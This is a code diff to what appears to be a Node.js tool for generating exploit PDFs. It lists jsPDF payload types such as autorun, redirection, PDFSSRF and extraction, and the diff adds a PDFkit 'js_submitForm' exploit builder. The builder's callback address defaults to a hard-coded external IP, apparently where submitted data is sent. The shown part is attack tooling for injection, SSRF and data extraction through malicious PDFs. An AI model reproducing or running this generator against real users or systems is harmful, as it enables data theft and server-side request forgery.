@@ -15,12 +15,12 @@ parser.add_argument('-u', '--uri', { help: 'Specify URI to inject/SSRF'});
 
 
 function list_jsPDF_exploits(){
-	console.log('Avaliable exploits are autorun, simple_js, redirection, PDFSSRF and extraction')
+	console.log('Avaliable exploits are: \nautorun \nsimple_js \nredirection \nPDFSSRF \nextraction')
 }
 
 
 function list_PDFkit_exploits(){
-	console.log('Avaliable exploits are none yet lol')
+	console.log('Avaliable exploits are: js_submitForm')
 }
 
 
@@ -86,6 +86,23 @@ function createExploit(vuln_lib, exploit, outname, direction='http://20.211.25.3
 		break;
 	case 'PDFkit':
 		console.log("running PDFkit");
+		const PDFkit_template = require("./PDFkit_template.js");
+		const template_PDFkit = new PDFkit_template;
+		var dict = {}
+		dict['js_submitForm'] = template_PDFkit.js_submitForm; 
+		console.log("generating " + exploit);
+		// dict[exploit](outname, direction)
+		template_status = dict[exploit](outname, direction)
+		template_status.then(status => {
+			console.log(status)
+			if (status[1] == 1){
+			console.log("Finished bake " + exploit)
+			return status[0]
+		}else {			
+		console.log("Failed to bake" + exploit)
+		return -1
+		}
+		})
 		break;
 	default:
 		console.log("lol, some error happened")
